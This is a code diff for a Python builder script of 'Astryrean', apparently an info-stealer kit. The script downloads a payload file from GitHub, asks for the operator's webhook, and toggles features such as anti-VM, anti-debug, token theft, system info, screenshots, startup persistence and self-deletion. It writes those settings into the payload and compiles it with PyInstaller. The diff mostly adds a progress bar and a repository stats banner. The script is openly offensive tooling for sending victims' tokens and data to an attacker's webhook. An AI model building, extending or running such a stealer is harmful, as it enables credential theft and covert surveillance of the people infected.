@@ -1,27 +1,3 @@
-"""
-MIT License
-
-Copyright (c) 2025 ᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
-"""
-
 import subprocess
 import colorama
 from colorama import Fore
@@ -30,12 +6,43 @@ import shutil
 import pyfiglet
 import requests
 from pystyle import Center
+from rich.console import Console
+from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, SpinnerColumn
+from rich import print as rprint
 
 colorama.init(autoreset=True)
 os.system("cls" if os.name == "nt" else "clear")
 
 target_file = "utils/main.py"  
 download_url = "https://raw.githubusercontent.com/zakocord/Astryrean/main/build/utils/main.py"  
+repo_url = "https://api.github.com/repos/zakocord/Astryrean" 
+
+console_rich = Console()
+
+ascii_art = pyfiglet.figlet_format("Astryrean", font="graffiti")
+colored_art = Fore.MAGENTA + ascii_art
+
+def get_github_stats():
+    try:
+        response = requests.get(repo_url)
+        response.raise_for_status()
+        data = response.json()
+        stars = data.get("stargazers_count", 0)
+        forks = data.get("forks_count", 0)
+        watch = data.get("watchers", 0)  
+        description = data.get("description")
+        return stars, forks, watch, description  
+    except requests.RequestException as e:
+        rprint(f"[red][-] GitHub stats fetch failed: {e}[/red]")
+        return None, None, None, None  
+
+stars, forks, watch, description = get_github_stats()
+descriptions = f"{description}" if description else "No description available."
+stats_text = f"Star: {stars} | Fork: {forks} | Watchers: {watch}"
+
+print(Center.XCenter(colored_art))
+print(Center.XCenter(Fore.MAGENTA + descriptions))
+print(Center.XCenter(Fore.MAGENTA + stats_text))
 
 class Debug:
     ANSI_COLORS = {
@@ -61,15 +68,30 @@ console = Debug()
 
 def download_file(url, destination):
     try:
-        console.log(f"[!] Downloading | {target_file}", "bright_yellow")
-        response = requests.get(url)
+        rprint(f"[yellow][!] Downloading | {target_file} | [Protocol.py : 378][/yellow]")
+        response = requests.get(url, stream=True)
         response.raise_for_status()
+        total_size = int(response.headers.get('content-length', 0))
         os.makedirs(os.path.dirname(destination), exist_ok=True)
-        with open(destination, "wb") as f:
-            f.write(response.content)
-        console.log("[+] Successfully Downloaded Files", "bright_green")
+
+        with Progress(
+            SpinnerColumn(),
+            TextColumn("[progress.description]{task.description}"),
+            BarColumn(),
+            TextColumn("[progress.percentage]{task.percentage:>3.1f}%"),
+            TimeElapsedColumn(),
+            console=console_rich,
+        ) as progress:
+            task = progress.add_task("Downloading...", total=total_size)
+
+            with open(destination, "wb") as f:
+                for data in response.iter_content(chunk_size=1024):
+                    f.write(data)
+                    progress.update(task, advance=len(data))
+
+        rprint("[green][+] Successfully Downloaded Files[/green]")
     except Exception as e:
-        console.log(f"[-] Download Failed: {e}", "bright_red")
+        rprint(f"[red][-] Download Failed: {e}[/red]")
 
 def get_user_input():
     h00k = console.input("Enter Your Webhook:", prefix="!", color="bright_magenta")
@@ -78,7 +100,7 @@ def get_user_input():
         h00k = console.input("Enter Your Webhook:", prefix="?", color="bright_magenta")
 
     options = {}
-    for key in ["anti_vm", "anti_debug", "token", "systeminfo", "screenshot", "startup", "restart", "self_delete"]: 
+    for key in ["anti_vm", "anti_debug", "token", "systeminfo", "screenshot", "startup", "restart", "self_delete"]:
         val = console.input(f"Enable {key.replace('_', ' ').title()}? (y/n):", prefix="?", color="bright_magenta")
         options[key] = val.lower() == 'y'
 
@@ -98,6 +120,7 @@ def update_main_py(settings):
         feature_start = None
         feature_end = None
         inside_feature = False
+        h00k_found = False
 
         for idx, line in enumerate(lines):
             if "feature = {" in line:
@@ -107,24 +130,30 @@ def update_main_py(settings):
                 feature_end = idx
                 break
 
+            if "h00k =" in line:
+                h00k_found = True
+                console.log(f"Found h00k = {line.strip()}", color="bright_cyan")
+
         if feature_start is not None and feature_end is not None:
             feature_block = '    feature = {\n'
             for key in ["anti_vm", "anti_debug", "token", "systeminfo", "screenshot", "startup", "restart", "self_delete"]:
-                feature_block += f'        "{key}": {str(settings[key]).capitalize()},\n'  
+                feature_block += f'        "{key}": {str(settings[key]).capitalize()},\n'
             feature_block += '    }\n'
 
             lines = lines[:feature_start] + [feature_block] + lines[feature_end+1:]
 
         for i, line in enumerate(lines):
-            if line.strip().startswith("h00k ="):
-                lines[i] = f'h00k = "{settings["h00k"]}"\n'  
+            if "h00k =" in line:
+                lines[i] = f'h00k = "{settings["h00k"]}"\n'
+                console.log(f"Replaced h00k = {settings['h00k']}", color="bright_cyan")
+                break  
 
         with open(target_file, "w", encoding="utf-8") as f:
             f.writelines(lines)
 
-        console.log("[+] successfully replaced main.py", color="bright_green")
+        rprint("[green][+] Successfully replaced main.py[/green]")
     except Exception as e:
-        console.log(f"[-] Failed to update main.py: {e}", color="bright_red")
+        rprint(f"[red][-] Failed to update main.py: {e}[/red]")
 
 def install_pyinstaller():
     console.log("[*] Installing PyInstaller...", color="bright_cyan")
@@ -144,6 +173,7 @@ def build_exe():
 
 def main():
     settings = get_user_input()
+    download_file(download_url, target_file)
     update_main_py(settings)
     install_pyinstaller()
     build_exe()
